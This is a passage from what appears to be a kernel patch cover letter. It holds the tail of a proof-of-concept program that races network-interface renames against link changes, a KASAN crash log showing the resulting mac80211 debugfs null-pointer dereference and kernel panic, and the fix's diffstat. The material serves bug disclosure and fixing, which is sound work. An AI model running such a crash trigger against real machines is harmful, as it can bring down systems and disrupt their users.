		"phy=%s wiphy=%u ifindex=%d if=%s/%s link_id=%u link_mac=%02x:%02x:%02x:%02x:%02x:%02x duration=%us\n",
		phyname, wiphy_idx, ctx.ifindex, ctx.name_a, ctx.name_b,
		ctx.link_id,
		ctx.link_addr[0], ctx.link_addr[1], ctx.link_addr[2],
		ctx.link_addr[3], ctx.link_addr[4], ctx.link_addr[5], duration);

	if (pthread_create(&th_rename, NULL, rename_worker, &ctx))
		die("pthread_create(rename)");
	if (pthread_create(&th_link, NULL, link_worker, &ctx))
		die("pthread_create(link)");

	start = time(NULL);
	while (!stop_flag) {
		sleep(1);
		log_stats();
		if (duration && (unsigned int)(time(NULL) - start) >= duration)
			stop_flag = 1;
	}

	pthread_join(th_rename, NULL);
	pthread_join(th_link, NULL);
	log_stats();
	return EXIT_SUCCESS;
}

------END poc.c--------

----BEGIN crash log----

[  527.470036][T10909] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000005: 0000 [#1] PREEMPT SMP KASAN NOPTI
[  527.471086][T10909] KASAN: null-ptr-deref in range [0x0000000000000028-0x000000000000002f]
[  527.471676][T10909] CPU: 0 UID: 1028 PID: 10909 Comm: poc Not tainted 6.12.95 #2
[  527.472187][T10909] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  527.473031][T10909] RIP: 0010:timestamp_truncate+0xcb/0x240
[  527.473469][T10909] Code: 89 fa 48 c1 ea 03 80 3c 02 00 0f 85 7f 01 00 00 48 8d 7b 28 4c 8b 6c 24 30 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 51 01 00 00 48 b8 00 00 00 00 00 fc ff df 48 8b
[  527.474750][T10909] RSP: 0018:ffffc900000af620 EFLAGS: 00010216
[  527.475186][T10909] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000017
[  527.475716][T10909] RDX: 0000000000000005 RSI: 000000000666bd8f RDI: 0000000000000028
[  527.476279][T10909] RBP: ffffc900000af6b0 R08: 0000000000000001 R09: fffffbfff2c699b1
[  527.476796][T10909] R10: ffffffff9634cd8f R11: 0000000000000002 R12: 1ffff92000015ec5
[  527.477349][T10909] R13: 000000000666bd8f R14: 000000006a6b1708 R15: 0000000000000000
[  527.477891][T10909] FS:  00007f078370c6c0(0000) GS:ffff888118a00000(0000) knlGS:0000000000000000
[  527.478508][T10909] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  527.478985][T10909] CR2: 00007f0b3b8f3c70 CR3: 0000000077eee000 CR4: 0000000000750ef0
[  527.479668][T10909] PKRU: 55555554
[  527.479940][T10909] Call Trace:
[  527.480158][T10909]  <TASK>
[  527.480360][T10909]  ? __pfx_timestamp_truncate+0x10/0x10
[  527.480734][T10909]  ? lockdep_hardirqs_on+0x7b/0x110
[  527.481140][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.481540][T10909]  ? inode_set_ctime_current+0x84/0x140
[  527.481923][T10909]  inode_set_ctime_current+0x96/0x140
[  527.482279][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.482655][T10909]  ? __pfx_inode_set_ctime_current+0x10/0x10
[  527.483069][T10909]  ? lock_acquire+0x2f/0xb0
[  527.483393][T10909]  ? simple_empty+0x21/0x130
[  527.483733][T10909]  simple_rename_timestamp+0x12f/0x1b0
[  527.484102][T10909]  ? _raw_spin_unlock+0x2d/0x50
[  527.484441][T10909]  simple_rename+0x1c7/0x2f0
[  527.484770][T10909]  debugfs_rename+0x377/0xcc0
[  527.485119][T10909]  ? __pfx_debugfs_rename+0x10/0x10
[  527.485473][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.485887][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.486254][T10909]  ? skb_dequeue+0x116/0x1a0
[  527.486593][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.486981][T10909]  ? ieee80211_debugfs_rename_netdev+0x107/0x170
[  527.487418][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.487796][T10909]  ieee80211_debugfs_rename_netdev+0x107/0x170
[  527.488264][T10909]  ? __pfx_ieee80211_debugfs_rename_netdev+0x10/0x10
[  527.488734][T10909]  ? _raw_spin_unlock_irqrestore+0x40/0x80
[  527.489162][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.489533][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.489911][T10909]  netdev_notify+0x10d/0x160
[  527.490241][T10909]  ? rcu_is_watching+0x12/0xc0
[  527.490590][T10909]  notifier_call_chain+0xa0/0x310
[  527.490948][T10909]  dev_change_name+0x3ef/0x8f0
[  527.491291][T10909]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  527.491664][T10909]  ? __pfx_dev_change_name+0x10/0x10
[  527.492023][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.492400][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.492769][T10909]  ? trace_contention_end+0xe6/0x140
[  527.493152][T10909]  dev_ifsioc+0xa70/0xc50
[  527.493443][T10909]  ? dev_ioctl+0x201/0xec0
[  527.493739][T10909]  ? __pfx_dev_ifsioc+0x10/0x10
[  527.494072][T10909]  ? __pfx___mutex_lock+0x10/0x10
[  527.494422][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.494799][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.495197][T10909]  ? apparmor_capable+0xb9/0x180
[  527.495552][T10909]  dev_ioctl+0x212/0xec0
[  527.495871][T10909]  sock_do_ioctl+0x1a7/0x220
[  527.496192][T10909]  ? __pfx_sock_do_ioctl+0x10/0x10
[  527.496561][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.496964][T10909]  sock_ioctl+0x490/0x5b0
[  527.497262][T10909]  ? __pfx_sock_ioctl+0x10/0x10
[  527.497588][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.498007][T10909]  ? lock_acquire+0x2f/0xb0
[  527.498313][T10909]  ? srso_alias_return_thunk+0x5/0xfbef5
[  527.498678][T10909]  ? __fget_files+0x1c9/0x300
[  527.499011][T10909]  __x64_sys_ioctl+0x131/0x1a0
[  527.499340][T10909]  do_syscall_64+0xc7/0x270
[  527.499642][T10909]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  527.500052][T10909] RIP: 0033:0x7f078381c91b
[  527.500384][T10909] Code: 00 48 89 44 24 18 31 c0 48 8d 44 24 60 c7 04 24 10 00 00 00 48 89 44 24 08 48 8d 44 24 20 48 89 44 24 10 b8 10 00 00 00 0f 05 <89> c2 3d 00 f0 ff ff 77 1c 48 8b 44 24 18 64 48 2b 04 25 28 00 00
[  527.501688][T10909] RSP: 002b:00007f078370be00 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
[  527.502267][T10909] RAX: ffffffffffffffda RBX: 0000000000000004 RCX: 00007f078381c91b
[  527.502789][T10909] RDX: 00007f078370be80 RSI: 0000000000008923 RDI: 0000000000000004
[  527.503332][T10909] RBP: 00007f078370be80 R08: 0000000000000073 R09: 00000000ffffffff
[  527.504287][T10909] R10: 0000000000000000 R11: 0000000000000246 R12: 000056001c51f036
[  527.504819][T10909] R13: 00007f078370be60 R14: 00007f078370be70 R15: 00007f0782f0c000
[  527.505402][T10909]  </TASK>
[  527.505609][T10909] Modules linked in:
[  527.506325][T10909] ---[ end trace 0000000000000000 ]---
[  527.506699][T10909] RIP: 0010:timestamp_truncate+0xcb/0x240
[  527.507114][T10909] Code: 89 fa 48 c1 ea 03 80 3c 02 00 0f 85 7f 01 00 00 48 8d 7b 28 4c 8b 6c 24 30 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 51 01 00 00 48 b8 00 00 00 00 00 fc ff df 48 8b
[  527.508459][T10909] RSP: 0018:ffffc900000af620 EFLAGS: 00010216
[  527.508883][T10909] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000017
[  527.509421][T10909] RDX: 0000000000000005 RSI: 000000000666bd8f RDI: 0000000000000028
[  527.509966][T10909] RBP: ffffc900000af6b0 R08: 0000000000000001 R09: fffffbfff2c699b1
[  527.510484][T10909] R10: ffffffff9634cd8f R11: 0000000000000002 R12: 1ffff92000015ec5
[  527.511019][T10909] R13: 000000000666bd8f R14: 000000006a6b1708 R15: 0000000000000000
[  527.511542][T10909] FS:  00007f078370c6c0(0000) GS:ffff888118a00000(0000) knlGS:0000000000000000
[  527.512175][T10909] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  527.512627][T10909] CR2: 00007f0b3b8f3c70 CR3: 0000000077eee000 CR4: 0000000000750ef0
[  527.513170][T10909] PKRU: 55555554
[  527.513416][T10909] Kernel panic - not syncing: Fatal exception
[  527.513977][T10909] Kernel Offset: disabled
[  527.514260][T10909] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  wifi: mac80211: serialize debugfs netdev rename with recreate

 net/mac80211/debugfs_netdev.c | 8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)

-- 
2.43.0

